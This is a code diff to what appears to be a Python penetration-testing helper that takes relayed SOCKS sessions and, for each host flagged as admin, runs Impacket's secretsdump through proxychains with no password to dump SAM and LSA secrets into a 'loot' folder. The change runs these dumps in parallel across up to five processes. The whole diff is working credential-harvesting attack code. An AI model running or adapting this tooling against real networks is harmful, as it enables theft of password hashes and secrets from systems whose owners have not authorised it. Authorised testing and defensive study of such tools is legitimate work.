@@ -5,6 +5,7 @@ except ImportError:
     from urllib2 import ProxyHandler, build_opener, Request
 
 import os, sys, json
+import concurrent.futures
 
 color_RED = '\033[91m'
 color_GRE = '\033[92m'
@@ -55,6 +56,13 @@ def config_check():
         print('{} ERROR you are missing "socks4  127.0.0.1 1080" in your proxychains config'.format(red_minus))
         sys.exit(1)
 
+
+def mt_execute(username, ip):
+    os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(username, ip, cwd, ip))
+    with open('dumped_ips', 'a') as f:
+        f.write(ip + '\n')
+        f.close()
+
 if __name__ == '__main__':
 
     if os.geteuid() != 0:
@@ -100,22 +108,19 @@ if __name__ == '__main__':
 
             if os.path.isdir(cwd + "/loot") == False:
                 os.makedirs(cwd + "/loot")
+            with concurrent.futures.ProcessPoolExecutor(max_workers=5) as executor: # multithreading yeahhhh
+                for item in tmp:
+                    dat = item.replace(']', '').split(',')
+                    if dat[3] == 'TRUE':
+                        if dat[1] not in dumped_ips:
+                            dumped_ips.append(dat[1])  # append the ip to dumped_ips to avoid dumping the same host twice
 
-            for item in tmp:
-                dat = item.replace(']', '').split(',')
-                if dat[3] == 'TRUE':
-                    if dat[1] not in dumped_ips:
-                        dumped_ips.append(dat[1])  # append the ip to dumped_ips to avoid dumping the same host twice
-
-                        # lsa secrets and sam dump courtesy of secretsdump
-                        try:
-                            os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(dat[2], dat[1], cwd, dat[1]))
-                            with open('dumped_ips', 'a') as f:
-                                f.write(dat[1] + '\n')
-                                f.close()
-                        except Exception as e:
-                            print(str(e))
-                            print('Error dumping secrets')
+                            # lsa secrets and sam dump courtesy of secretsdump
+                            try:
+                                executor.submit(mt_execute, dat[2], dat[1])
+                            except Exception as e:
+                                print(str(e))
+                                print('Error dumping secrets')
 
 
         else:
